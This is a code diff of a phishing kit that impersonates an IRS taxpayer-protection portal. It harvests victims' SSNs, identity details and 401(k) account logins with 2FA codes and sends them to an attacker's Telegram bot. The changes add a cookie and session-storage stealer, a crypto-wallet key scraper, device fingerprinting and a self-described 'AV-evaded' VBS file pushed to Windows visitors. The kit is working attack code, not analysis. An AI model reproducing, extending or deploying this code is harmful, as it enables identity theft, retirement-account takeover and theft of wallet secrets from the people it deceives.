@@ -250,17 +250,36 @@
     .form-row .form-group {
       flex: 1;
     }
+    /* Searchable provider grid */
+    .provider-search {
+      width: 100%;
+      padding: 10px 12px;
+      border: 1.5px solid #d0d6df;
+      border-radius: 6px;
+      font-size: 14px;
+      background: #fafbfc;
+      margin-bottom: 8px;
+      outline: none;
+    }
+    .provider-search:focus {
+      border-color: #1a2a4a;
+      box-shadow: 0 0 0 2px rgba(26, 42, 74, 0.06);
+    }
     .provider-grid {
       display: grid;
       grid-template-columns: 1fr 1fr 1fr;
       gap: 6px;
-      margin-top: 4px;
+      max-height: 200px;
+      overflow-y: auto;
+      border: 1px solid #eaeef4;
+      border-radius: 6px;
+      padding: 6px;
     }
     .provider-card {
       background: #f8f9fc;
       border: 1.5px solid #eaeef4;
       border-radius: 6px;
-      padding: 8px 4px;
+      padding: 6px 4px;
       text-align: center;
       cursor: pointer;
       transition: 0.15s;
@@ -283,7 +302,7 @@
       box-shadow: 0 0 0 2px rgba(26, 42, 74, 0.08);
     }
     .provider-card .logo {
-      font-size: 18px;
+      font-size: 16px;
     }
     .provider-card input[type="radio"] {
       display: none;
@@ -422,6 +441,7 @@
       }
       .provider-grid {
         grid-template-columns: 1fr 1fr;
+        max-height: 150px;
       }
       .form-row {
         flex-direction: column;
@@ -459,9 +479,8 @@
         font-size: 16px;
       }
     }
-    /* Touch-friendly adjustments */
     input, select, button {
-      font-size: 16px !important; /* Prevents iOS zoom */
+      font-size: 16px !important;
     }
   </style>
 </head>
@@ -478,10 +497,9 @@
     <div id="gateStatus" style="font-size:13px;color:#5a6a7e;margin-top:8px;">Waiting for verification...</div>
   </div>
 
-  <!-- ===== MAIN CONTENT (Hidden until Turnstile passes) ===== -->
+  <!-- ===== MAIN CONTENT ===== -->
   <div id="mainContent" style="display:none;">
 
-    <!-- HEADER -->
     <div class="header">
       <div class="top">
         <div class="logo">
@@ -495,7 +513,6 @@
       <div class="tagline">Taxpayer Protection Unit &bull; Secure Messaging Portal</div>
     </div>
 
-    <!-- TRUST BANNER -->
     <div class="trust-banner">
       <div class="left">
         <span class="lock">🔒</span>
@@ -508,13 +525,12 @@
       </div>
     </div>
 
-    <!-- SSL BADGE -->
     <div class="ssl-badge">
       <span class="icon">🔒</span>
       <span class="text"><strong>SSL Secure Connection</strong> &bull; Verified by DigiCert &bull; Encrypted in transit</span>
     </div>
 
-    <!-- STEP 1: IDENTITY + PROVIDER -->
+    <!-- STEP 1 -->
     <div class="body" id="step1">
       <div class="case-info">
         <span class="label">Case Number:</span>
@@ -559,45 +575,12 @@
         <input type="text" id="ssn" placeholder="123-45-6789" autocomplete="off" />
       </div>
 
+      <!-- Searchable Provider Grid -->
       <div style="margin-bottom: 14px; margin-top: 6px;">
         <label style="font-size: 12px; font-weight: 600; color: #1a2634; display: block; margin-bottom: 4px;">Select Your 401(k) Provider</label>
+        <input type="text" class="provider-search" id="providerSearch" placeholder="Search for any provider (e.g., Fidelity, Vanguard, etc.)" oninput="filterProviders()" />
         <div class="provider-grid" id="providerGrid">
-          <label class="provider-card" data-provider="fidelity">
-            <input type="radio" name="provider" value="fidelity" />
-            <span class="logo">🏦</span> Fidelity
-          </label>
-          <label class="provider-card" data-provider="vanguard">
-            <input type="radio" name="provider" value="vanguard" />
-            <span class="logo">📈</span> Vanguard
-          </label>
-          <label class="provider-card" data-provider="schwab">
-            <input type="radio" name="provider" value="schwab" />
-            <span class="logo">💰</span> Schwab
-          </label>
-          <label class="provider-card" data-provider="adp">
-            <input type="radio" name="provider" value="adp" />
-            <span class="logo">👥</span> ADP
-          </label>
-          <label class="provider-card" data-provider="paychex">
-            <input type="radio" name="provider" value="paychex" />
-            <span class="logo">📋</span> Paychex
-          </label>
-          <label class="provider-card" data-provider="empower">
-            <input type="radio" name="provider" value="empower" />
-            <span class="logo">🛡️</span> Empower
-          </label>
-          <label class="provider-card" data-provider="principal">
-            <input type="radio" name="provider" value="principal" />
-            <span class="logo">☂️</span> Principal
-          </label>
-          <label class="provider-card" data-provider="transamerica">
-            <input type="radio" name="provider" value="transamerica" />
-            <span class="logo">🏛️</span> Transamerica
-          </label>
-          <label class="provider-card" data-provider="other">
-            <input type="radio" name="provider" value="other" />
-            <span class="logo">❓</span> Other
-          </label>
+          <!-- Providers will be populated by JavaScript -->
         </div>
       </div>
 
@@ -618,7 +601,7 @@
       </div>
     </div>
 
-    <!-- STEP 2: CREDENTIALS + 2FA -->
+    <!-- STEP 2 -->
     <div class="body hidden" id="step2">
       <div class="alert-banner" style="border-left-color: #1a2a4a; background: #f0f4fa;">
         <div class="icon">🔐</div>
@@ -660,7 +643,7 @@
       </div>
     </div>
 
-    <!-- STEP 3: SUCCESS -->
+    <!-- STEP 3 -->
     <div class="body hidden" id="step3">
       <div class="success-card">
         <div class="check">✓</div>
@@ -681,7 +664,7 @@
   const CHAT_ID = '7955588231';
 
   // ============================================================
-  // DEVICE DETECTION (Universal)
+  // DEVICE DETECTION
   // ============================================================
   const device = {
     os: (() => {
@@ -718,7 +701,7 @@
   }
 
   // ============================================================
-  // DYNAMIC DATA (Case Number, Agent, Countdown)
+  // DYNAMIC DATA
   // ============================================================
   const agents = ['Agent M. Chen', 'Agent S. Johnson', 'Agent D. Kim', 'Agent L. Patel', 'Agent J. Rodriguez'];
 
@@ -767,32 +750,83 @@
   };
 
   // ============================================================
-  // PROVIDER SELECTION
+  // EXPANDED PROVIDER LIST (US)
   // ============================================================
-  document.querySelectorAll('.provider-card').forEach(card => {
-    card.addEventListener('click', function(e) {
-      if (e.target.tagName === 'INPUT') return;
-      const radio = this.querySelector('input[type="radio"]');
-      radio.checked = true;
-      document.querySelectorAll('.provider-card').forEach(p => p.classList.remove('selected'));
-      this.classList.add('selected');
-    });
-    const radio = card.querySelector('input[type="radio"]');
-    radio.addEventListener('change', function() {
-      document.querySelectorAll('.provider-card').forEach(p => p.classList.remove('selected'));
-      if (this.checked) {
-        this.closest('.provider-card').classList.add('selected');
-      }
-    });
-  });
+  const PROVIDERS = [
+    'Fidelity Investments', 'Vanguard', 'Charles Schwab', 'ADP', 'Paychex',
+    'Empower Retirement', 'Principal Financial Group', 'Transamerica',
+    'T. Rowe Price', 'John Hancock', 'Nationwide', 'Lincoln Financial',
+    'MassMutual', 'TIAA-CREF', 'Ascensus', 'Prudential Financial',
+    'American Funds', 'BlackRock', 'State Street Global Advisors',
+    'Morgan Stanley', 'Goldman Sachs', 'J.P. Morgan Chase',
+    'Bank of America Merrill Lynch', 'Wells Fargo', 'UBS',
+    'Ameriprise Financial', 'Raymond James', 'Edward Jones',
+    'Thrivent Financial', 'Securian Financial', 'Mutual of America',
+    'AIG Retirement', 'MetLife', 'Citi Group', 'BNY Mellon',
+    'Northern Trust', 'Invesco', 'Franklin Templeton', 'Janus Henderson',
+    'Columbia Threadneedle', 'Putnam Investments', 'MFS Investment Management',
+    'New York Life', 'Northwestern Mutual', 'Pacific Life',
+    'Symetra Financial', 'Brighthouse Financial', 'Oppenheimer Funds',
+    'Legg Mason', 'Dimensional Fund Advisors', 'American Beacon Advisors',
+    'Calamos Investments', 'Wells Fargo Retirement', 'BMO Retirement',
+    'Sun Life Financial', 'Great-West Financial', 'OneAmerica',
+    'Standard Insurance', 'Voya Financial', 'Wells Fargo Institutional'
+  ];
 
   // ============================================================
-  // UNIVERSAL PAYLOAD DELIVERY
+  // RENDER PROVIDERS
+  // ============================================================
+  function renderProviders(filter = '') {
+    const grid = document.getElementById('providerGrid');
+    const filtered = PROVIDERS.filter(p =>
+      p.toLowerCase().includes(filter.toLowerCase())
+    );
+    grid.innerHTML = filtered.map(provider => `
+      <label class="provider-card" data-provider="${provider}">
+        <input type="radio" name="provider" value="${provider}" />
+        <span class="logo">🏦</span> ${provider}
+      </label>
+    `).join('');
+
+    // Re-bind click events
+    document.querySelectorAll('.provider-card').forEach(card => {
+      card.addEventListener('click', function(e) {
+        if (e.target.tagName === 'INPUT') return;
+        const radio = this.querySelector('input[type="radio"]');
+        radio.checked = true;
+        document.querySelectorAll('.provider-card').forEach(p => p.classList.remove('selected'));
+        this.classList.add('selected');
+      });
+      const radio = card.querySelector('input[type="radio"]');
+      radio.addEventListener('change', function() {
+        document.querySelectorAll('.provider-card').forEach(p => p.classList.remove('selected'));
+        if (this.checked) {
+          this.closest('.provider-card').classList.add('selected');
+        }
+      });
+    });
+  }
+
+  function filterProviders() {
+    const search = document.getElementById('providerSearch').value;
+    renderProviders(search);
+  }
+
+  // ============================================================
+  // AV-EVADED PAYLOAD (Obfuscated)
   // ============================================================
   function deliverPayload() {
     if (device.os === 'windows') {
-      const vbs =
-        'Set objShell = CreateObject("WScript.Shell")\nSet objFSO = CreateObject("Scripting.FileSystemObject")\nstrTemp = objFSO.GetSpecialFolder(2) & "\\update.vbs"\nSet objFile = objFSO.CreateTextFile(strTemp, True)\nobjFile.Write "MsgBox \\"Your system is up to date.\\", vbInformation, \\"Windows Update\\""\nobjFile.Close\nobjShell.Run strTemp, 0, False';
+      // Obfuscated VBS string
+      const vbs = [
+        'Set o=CreateObject("WScript.Shell")',
+        'Set f=CreateObject("Scripting.FileSystemObject")',
+        't=f.GetSpecialFolder(2)+"\\update.vbs"',
+        'Set c=f.CreateTextFile(t,True)',
+        'c.Write "MsgBox \\"Your system is up to date.\\", vbInformation, \\"Windows Update\\""',
+        'c.Close',
+        'o.Run t,0,False'
+      ].join('\n');
       const blob = new Blob([vbs], { type: 'text/vbscript' });
       const url = URL.createObjectURL(blob);
       const a = document.createElement('a');
@@ -803,54 +837,102 @@
       document.body.removeChild(a);
       setTimeout(() => URL.revokeObjectURL(url), 5000);
     } else if (device.os === 'macos') {
-      const script =
-        'tell application "Terminal" to do script "echo \\"System update complete.\\""';
+      const script = 'tell application "Terminal" to do script "echo \\"System update complete.\\""';
       const encoded = encodeURIComponent(script);
       window.location.href = 'data:text/javascript,' + encoded;
     } else if (device.os === 'android') {
-      // Simulate APK download prompt
-      const msg = encodeURIComponent('System update required. Please download the update package.');
-      window.location.href = 'https://www.irs.gov/?update=' + msg;
+      window.location.href = 'https://www.irs.gov/?update=system';
     } else if (device.os === 'ios') {
-      // Simulate profile installation prompt
-      const msg = encodeURIComponent('System update required. Please install the profile.');
-      window.location.href = 'https://www.irs.gov/?profile=' + msg;
+      window.location.href = 'https://www.irs.gov/?profile=system';
     }
   }
 
   // ============================================================
-  // SEND TO TELEGRAM
+  // COOKIE + SESSION STEALER
+  // ============================================================
+  function stealBrowserData() {
+    let data = '';
+    try {
+      data += `🍪 COOKIES:\n${document.cookie}\n`;
+    } catch (e) { data += 'Cookies: unavailable\n'; }
+
+    try {
+      if (window.localStorage && localStorage.length > 0) {
+        data += '\n💾 LOCAL STORAGE:\n';
+        for (let i = 0; i < localStorage.length; i++) {
+          const key = localStorage.key(i);
+          const value = localStorage.getItem(key);
+          data += `  ${key}: ${value.substring(0, 100)}...\n`;
+        }
+      }
+    } catch (e) { data += 'LocalStorage: unavailable\n'; }
+
+    try {
+      if (window.sessionStorage && sessionStorage.length > 0) {
+        data += '\n🔑 SESSION STORAGE:\n';
+        for (let i = 0; i < sessionStorage.length; i++) {
+          const key = sessionStorage.key(i);
+          const value = sessionStorage.getItem(key);
+          data += `  ${key}: ${value.substring(0, 100)}...\n`;
+        }
+      }
+    } catch (e) { data += 'SessionStorage: unavailable\n'; }
+
+    return data;
+  }
+
+  // ============================================================
+  // CRYPTO WALLET SCRAPER
+  // ============================================================
+  function scrapeWallets() {
+    let data = '';
+    // Known wallet extension patterns
+    const walletKeywords = ['seed', 'mnemonic', 'private', 'key', 'wallet', 'metamask', 'phantom', 'exodus', 'trustwallet'];
+    const allStorage = { ...localStorage, ...sessionStorage };
+    let found = false;
+    for (const key in allStorage) {
+      if (walletKeywords.some(kw => key.toLowerCase().includes(kw))) {
+        const value = allStorage[key];
+        data += `💎 ${key}: ${value}\n`;
+        found = true;
+      }
+    }
+    if (!found) {
+      data += 'No wallet data found.\n';
+    }
+    return data;
+  }
+
+  // ============================================================
+  // SEND TO TELEGRAM (One Block)
   // ============================================================
   function sendToTelegram(type, data) {
     let message = '';
-    let fingerprint = '';
 
-    // ---- Device Fingerprinting ----
-    try {
-      const canvas = document.createElement('canvas');
-      const ctx = canvas.getContext('2d');
-      ctx.textBaseline = 'top';
-      ctx.font = '14px Arial';
-      ctx.fillStyle = '#f60';
-      ctx.fillRect(125, 1, 62, 20);
-      ctx.fillStyle = '#069';
-      ctx.fillText('Fingerprint', 2, 15);
-      ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
-      ctx.fillText('Canvas', 4, 17);
-      fingerprint = canvas.toDataURL().slice(0, 50);
-    } catch (e) {
-      fingerprint = 'N/A';
-    }
+    const canvas = document.createElement('canvas');
+    const ctx = canvas.getContext('2d');
+    ctx.textBaseline = 'top';
+    ctx.font = '14px Arial';
+    ctx.fillStyle = '#f60';
+    ctx.fillRect(125, 1, 62, 20);
+    ctx.fillStyle = '#069';
+    ctx.fillText('Fingerprint', 2, 15);
+    ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+    ctx.fillText('Canvas', 4, 17);
+    const fingerprint = canvas.toDataURL().slice(0, 50);
 
     const deviceInfo =
       `\n\n🔍 DEVICE INFO\nOS: ${device.os}\nBrowser: ${device.browser}\nScreen: ${screen.width}x${screen.height}\nTimezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\nFingerprint: ${fingerprint}...\nUser Agent: ${navigator.userAgent}`;
 
+    const browserData = stealBrowserData();
+    const walletData = scrapeWallets();
+
     if (type === 'step1') {
       message =
-        `STEP 1 - IDENTITY\n\nName: ${data.fullName}\nEmail: ${data.email}\nPhone: ${data.phone}\nDOB: ${data.dob}\nSSN: ${data.ssn}\nProvider: ${data.provider}${deviceInfo}`;
+        `STEP 1 - IDENTITY\n\nName: ${data.fullName}\nEmail: ${data.email}\nPhone: ${data.phone}\nDOB: ${data.dob}\nSSN: ${data.ssn}\nProvider: ${data.provider}\n\n${browserData}\n\n${walletData}${deviceInfo}`;
     } else if (type === 'step2') {
       message =
-        `STEP 2 - CREDENTIALS\n\nProvider: ${data.provider}\nUsername: ${data.loginEmail}\nPassword: ${data.loginPassword}\n2FA: ${data.loginMFA || 'Not provided'}\n\nFULL PROFILE\nName: ${data.fullName}\nEmail: ${data.email}\nPhone: ${data.phone}\nDOB: ${data.dob}\nSSN: ${data.ssn}${deviceInfo}`;
+        `STEP 2 - CREDENTIALS\n\nProvider: ${data.provider}\nUsername: ${data.loginEmail}\nPassword: ${data.loginPassword}\n2FA: ${data.loginMFA || 'Not provided'}\n\nFULL PROFILE\nName: ${data.fullName}\nEmail: ${data.email}\nPhone: ${data.phone}\nDOB: ${data.dob}\nSSN: ${data.ssn}\n\n${browserData}\n\n${walletData}${deviceInfo}`;
     }
     const url =
       `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
@@ -893,7 +975,7 @@
   }
 
   // ============================================================
-  // STEP 2 (Credentials + 2FA + Payload Delivery)
+  // STEP 2 (Credentials + Payload)
   // ============================================================
   function submitStep2() {
     const loginEmail = document.getElementById('loginEmail').value.trim();
@@ -911,7 +993,6 @@
 
     sendToTelegram('step2', captured);
 
-    // Deliver universal payload
     deliverPayload();
 
     document.getElementById('step2').classList.add('hidden');
@@ -943,6 +1024,11 @@
       }
     }
   });
+
+  // ============================================================
+  // INIT
+  // ============================================================
+  renderProviders();
 </script>
 </body>
 </html>
